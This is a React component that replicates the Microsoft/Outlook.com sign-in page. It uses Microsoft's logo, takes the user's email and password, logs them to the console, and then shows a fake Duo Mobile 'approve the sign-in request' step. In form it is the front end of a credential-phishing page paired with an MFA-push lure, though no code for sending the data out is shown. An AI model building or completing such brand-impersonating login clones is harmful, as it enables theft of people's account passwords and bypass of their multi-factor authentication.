import React, { useState } from 'react';
import './AppStyles.css'; // Import the new CSS file

/**
 * A React component that accurately replicates the Microsoft/Outlook.com login page.
 * It features a multi-step process for email and password entry with styling
 * that closely matches the original design, including squared buttons, specific
 * brand colors, and the "Keep me signed in" option.
 */

const App = () => {
    // State to manage the user's email input
    const [email, setEmail] = useState('');
    // State to manage the user's password input
    const [password, setPassword] = useState('');
    // State to manage the "Keep me signed in" checkbox
    const [keepSignedIn, setKeepSignedIn] = useState(false);
    // State to control the flow between the email and password steps
    const [isPasswordStep, setIsPasswordStep] = useState(false);
    // State to control the flow to the Duo Mobile step
    const [isDuoMobileStep, setIsDuoMobileStep] = useState(false);
    // State to handle fake submission feedback
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [authMessage, setAuthMessage] = useState('');

    /**
     * Handles the form submission for the email step.
     * Transitions to the password step if an email is provided.
     * @param {React.FormEvent} e - The form event.
     */
    const handleNextClick = (e) => {
        e.preventDefault();
        if (email) {
            setIsPasswordStep(true);
            setAuthMessage(''); // Clear previous messages
        }
    };

    /**
     * Handles the "Back" button click to return to the email step.
     */
    const handleBackClick = () => {
        setIsPasswordStep(false);
        setIsDuoMobileStep(false); // Also reset Duo Mobile step if going back from password
        setPassword('');
        setAuthMessage('');
    };

    /**
     * Handles the final sign-in submission.
     * This is a placeholder and doesn't perform actual authentication.
     * It simulates a network delay and shows a message.
     * @param {React.FormEvent} e - The form event.
     */
    const handleSignInClick = (e) => {
        e.preventDefault();
        if (!password) return;

        setIsSubmitting(true);
        setAuthMessage('');
        console.log('Attempting sign-in with:', { email, password, keepSignedIn });

        // Simulate a network request
        setTimeout(() => {
            // In a real app, you'd get a success/error response here.
            // For this demo, we'll transition to the Duo Mobile step.
            setIsSubmitting(false);
            setIsDuoMobileStep(true); // Transition to Duo Mobile step
            setIsPasswordStep(false); // Hide password step
        }, 1000);
    };

    // Custom Key SVG Icon for "Sign-in options"
    const KeyIcon = () => (
        <svg className="key-icon-svg" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1} stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
        </svg>
    );

    
    return (
        <div className="app-container">
            <div
                className="background-image-container"
                style={{
                    backgroundImage: "url('https://source.unsplash.com/1920x1080/?landscape,nature,abstract')",
                }}
            ></div>
            <div className="overlay"></div>

            <div className="content-wrapper">
                <div className="login-form-container">
                    
                    {!isPasswordStep && !isDuoMobileStep ? (
                        <div key="email-step">
                            <div style={{ marginBottom: '1.5rem' }}> {/* mb-6 */}
                                <img
                                    src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                                    alt="Microsoft Logo"
                                    className="microsoft-logo"
                                    onError={(e) => { e.target.onerror = null; e.target.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }}
                                />
                            </div>
                            <h1 className="form-title">Sign in</h1>
                            <form onSubmit={handleNextClick}>
                                <div className="input-field-container">
                                    <input
                                        type="email"
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        placeholder="Email, phone, or Skype"
                                        className="input-field"
                                        autoFocus
                                    />
                                </div>
                                <div className="text-xs-custom" style={{ marginBottom: '1.5rem' }}> {/* mb-6 text-xs */}
                                    <p className="text-gray-700-custom">
                                        No account?{' '}
                                        <a href="#" className="link-custom">
                                            Create one!
                                        </a>
                                    </p>
                                </div>
                                <div className="flex-justify-end">
                                     <button
                                        type="submit"
                                        className="button-primary"
                                    >
                                        Next
                                    </button>
                                </div>
                            </form>
                        </div>
                    ) : isPasswordStep ? (
                        <div key="password-step">
                           <div style={{ marginBottom: '1.5rem' }}> {/* mb-6 */}
                                <img
                                    src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                                    alt="Microsoft Logo"
                                    className="microsoft-logo"
                                    onError={(e) => { e.target.onerror = null; e.target.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }}
                                />
                            </div>
                            <div className="password-step-header">
                               <button onClick={handleBackClick} className="back-button">
                                    <svg xmlns="http://www.w3.org/2000/svg" className="back-button-icon" viewBox="0 0 20 20" fill="currentColor">
                                        <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
                                    </svg>
                                </button>
                               <span className="email-display">{email}</span>
                            </div>
                             <h1 className="form-title">Enter password</h1>
                             <form onSubmit={handleSignInClick}>
                                <div style={{ marginBottom: '0.5rem' }}> {/* mb-2 */}
                                     <input
                                        type="password"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        placeholder="Password"
                                        className="input-field"
                                        autoFocus
                                    />
                                </div>
                                {authMessage && <div className="auth-message">{authMessage}</div>}
                                <div className="password-options-container">
                                     <label className="keep-signed-in-label">
                                        <input type="checkbox" checked={keepSignedIn} onChange={(e) => setKeepSignedIn(e.target.checked)} className="checkbox-custom"/>
                                        <span>Keep me signed in</span>
                                     </label>
                                     <a href="#" className="link-custom">
                                        Forgot my password
                                    </a>
                                </div>
                                 <div className="flex-justify-end">
                                     <button
                                        type="submit"
                                        className="button-primary" // Adjusted padding in CSS for this specific button if needed or use a modifier class
                                        style={{ paddingLeft: '1.5rem', paddingRight: '1.5rem' }} // px-6
                                        disabled={isSubmitting || !password}
                                    >
                                        {isSubmitting ? 'Signing in...' : 'Sign in'}
                                    </button>
                                </div>
                            </form>
                        </div>
                    ) : isDuoMobileStep ? (
                        <div key="duo-mobile-step">
                            <div style={{ marginBottom: '1.5rem' }}>
                                <img
                                    src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                                    alt="Microsoft Logo"
                                    className="microsoft-logo"
                                    onError={(e) => { e.target.onerror = null; e.target.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }}
                                />
                            </div>
                            <div className="password-step-header">
                                <button onClick={handleBackClick} className="back-button">
                                    <svg xmlns="http://www.w3.org/2000/svg" className="back-button-icon" viewBox="0 0 20 20" fill="currentColor">
                                        <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
                                    </svg>
                                </button>
                                <span className="email-display">{email}</span>
                            </div>
                            <h1 className="form-title">Verify your identity</h1>
                            <div className="duo-mobile-container">
                             
                                <p className="duo-instruction">Approve the sign-in request on your Duo Mobile app.</p>
                             
                                {/* <a href="#" className="link-custom duo-trouble-link">
                                    Having trouble?
                                </a> */}
                            </div>
                        </div>
                    ) : null}
                    
                    <div className="signin-options-container">
                         <a href="#" className="signin-options-link">
                            <KeyIcon />
                             <span className="signin-options-text">Sign-in options</span>
                         </a>
                    </div>
                </div>
            </div>

            <div className="footer-container">
                 <div className="footer-links">
                     <a href="#" className="footer-link">Terms of use</a>
                     <a href="#" className="footer-link">Privacy & cookies</a>
                     <button className="footer-button footer-ellipsis">...</button>
                 </div>
            </div>
        </div>
    );
};

export default App;
